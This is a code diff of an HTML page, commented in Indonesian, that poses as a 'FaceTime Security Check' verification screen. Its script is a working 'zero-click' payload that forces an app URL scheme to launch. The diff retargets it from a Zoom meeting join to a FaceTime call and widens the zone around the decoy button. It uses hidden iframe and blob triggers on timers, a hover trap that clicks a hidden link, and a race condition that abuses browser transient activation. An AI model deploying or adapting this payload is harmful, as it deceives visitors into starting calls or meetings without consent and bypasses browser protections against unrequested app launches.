@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>System Security Verification</title>
+<title>System Verification</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
   body {
@@ -38,7 +38,7 @@
     margin-top: 20px; background: #000; color: #0f0;
     padding: 10px; font-family: monospace; font-size: 12px;
     border-radius: 6px; width: 100%; max-width: 400px;
-    height: 100px; overflow-y: auto; text-align: left;
+    height: 120px; overflow-y: auto; text-align: left;
   }
   iframe { display: none; }
 </style>
@@ -46,13 +46,13 @@
 <body>
 
 <div class="panel">
-  <h1>🔒 Security Verification</h1>
-  <p>Gerakkan pointer atau klik tombol untuk verifikasi sistem.</p>
+  <h1>📹 FaceTime Security Check</h1>
+  <p>Gerakkan pointer atau klik tombol untuk memverifikasi identitas Anda.</p>
   
   <div class="fake-btn" id="btnWrapper">
-    Verify System
-    <!-- SKEMA TARGET: Ganti dengan zoommtg://, facetime://, slack://, dll -->
-    <a href="zoommtg://zoom.us/join?action=join&confno=123456789" class="trap-link" id="trapLink"></a>
+    Verify Identity
+    <!-- SKEMA FACETIME YANG VALID -->
+    <a href="facetime://security@apple.com" class="trap-link" id="trapLink"></a>
   </div>
 </div>
 
@@ -71,8 +71,8 @@
     console.log(msg);
   }
 
-  // Skema target untuk Zero-Click
-  var targetScheme = "zoommtg://zoom.us/join?action=join&confno=123456789";
+  // Skema FaceTime Target
+  var targetScheme = "facetime://security@apple.com";
 
   // ============================================
   // 1. ZERO-CLICK TRIGGER (IFRAME SANDBOX)
@@ -118,16 +118,16 @@
   document.body.addEventListener('mousemove', function(e) {
     if (hasTriggered) return;
     
-    // Jika pointer bergerak ke area tengah (dekat tombol)
     var x = e.clientX;
     var y = e.clientY;
     
-    if (x > window.innerWidth / 2 - 100 && x < window.innerWidth / 2 + 100 &&
-        y > window.innerHeight / 2 - 100 && y < window.innerHeight / 2 + 100) {
+    // Jika pointer mendekat ke area tombol
+    if (x > window.innerWidth / 2 - 150 && x < window.innerWidth / 2 + 150 &&
+        y > window.innerHeight / 2 - 150 && y < window.innerHeight / 2 + 150) {
       hasTriggered = true;
-      log("[Hover] Pointer mendekat. Memicu skema...");
+      log("[Hover] Pointer mendekat. Memicu FaceTime...");
       
-      // Trigger via trapLink click (paling mungkin berhasil)
+      // Trigger via trapLink click
       trapLink.click();
     }
   });
@@ -139,9 +139,8 @@
     if (hasTriggered) return;
     hasTriggered = true;
     
-    log("[Click] Gesture terdeteksi. Memicu skema (Race Condition)...");
+    log("[Click] Gesture terdeteksi. Memicu FaceTime (Race Condition)...");
     
-    // Eksekusi dalam microtask (0ms) untuk memanfaatkan Transient Activation
     queueMicrotask(function() {
       try {
         window.location.replace(targetScheme);
@@ -153,13 +152,10 @@
   // 5. TRIGGER CHAIN (EKSEKUSI OTOMATIS)
   // ============================================
   
-  // Eksekusi Iframe Sandbox setelah 1 detik (Zero-Click)
   setTimeout(zeroClickIframe, 1000);
-  
-  // Eksekusi Blob Wrapper setelah 2 detik (Zero-Click)
   setTimeout(zeroClickBlob, 2000);
 
-  log("Payload siap. Menunggu Zero-Click atau interaksi user...");
+  log("Payload FaceTime siap. Menunggu Zero-Click atau interaksi user...");
 
 })();
 </script>
